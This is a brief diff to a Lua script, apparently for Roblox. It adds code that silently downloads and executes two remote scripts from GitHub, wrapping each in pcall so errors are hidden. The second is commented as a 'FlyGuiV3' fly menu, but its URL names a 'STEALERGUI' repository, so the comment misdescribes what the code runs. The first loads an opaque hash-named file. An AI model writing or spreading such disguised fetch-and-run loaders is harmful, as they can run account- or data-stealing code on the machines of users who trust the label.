@@ -1,1 +1,9 @@
+-- Execute first external script (BOOMBANG)
+pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/BOOMBANG/refs/heads/main/0058bdef414fd101670fc0b994129c60.txt"))()
+end)
+
+-- Execute second external script (FlyGuiV3)
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/STEALERGUI/refs/heads/main/Sceipt"))()
+end)
